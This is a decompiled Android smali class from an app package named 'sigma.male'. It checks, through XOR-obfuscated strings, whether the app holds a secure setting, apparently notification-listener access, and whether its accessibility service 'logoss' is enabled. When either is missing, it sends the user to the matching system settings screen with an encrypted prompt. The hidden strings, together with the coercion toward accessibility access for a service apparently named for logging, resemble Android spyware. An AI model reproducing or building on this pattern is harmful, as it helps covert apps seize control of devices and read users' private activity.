.class Lsigma/male/MainActivity$22$1;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/MainActivity$22;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lsigma/male/MainActivity$22;


# direct methods
.method constructor <init>(Lsigma/male/MainActivity$22;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    .line 640
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .prologue
    .line 643
    iget-object v0, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v0}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-virtual {v0}, Lsigma/male/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 645
    const-string v1, "MDonT1QwMBlDVyE9IERbNCAvQlYKOC9eTDA6I19L"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 646
    iget-object v1, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v1}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-virtual {v1}, Lsigma/male/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    .line 649
    if-eqz v0, :cond_0

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 650
    :cond_0
    iget-object v0, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v0}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "NDoiX1c8MGheXSEgL0NfJnoHbmwcGwhydhoAD2txFhUSZHcbCwpkawERCGhqCgcDeWwcGgF+"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lsigma/male/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 651
    iget-object v0, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v0}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-virtual {v0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "BTgjTEswdANDWTc4Iw12OiAvS1E2NTJEVzt0B05bMCc1DUw6dCtMUzB0MkVRJnQnXUh1IylfU3UkNEJIMCYqVBY="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 655
    :cond_1
    iget-object v0, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v0}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v1}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-virtual {v1}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/logoss;

    invoke-virtual {v0, v1, v2}, Lsigma/male/MainActivity;->isAccessServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 657
    new-instance v0, Landroid/content/Intent;

    const-string v1, "NDoiX1c8MGheXSEgL0NfJnoHbnsQBxVkehwYD3lhCgcDeWwcGgF+"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 658
    iget-object v1, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v1}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-virtual {v1, v0}, Lsigma/male/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 659
    iget-object v0, p0, Lsigma/male/MainActivity$22$1;->this$1:Lsigma/male/MainActivity$22;

    invoke-static {v0}, Lsigma/male/MainActivity$22;->access$0(Lsigma/male/MainActivity$22;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-virtual {v0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "BTgjTEswdANDWTc4Iw1/OjshQV11ByNfTjw3I14YITtmQFk+MWZZUDwnZkxIJXQxQko+dDZfVyUxNEFBew=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 664
    :cond_2
    return-void
.end method
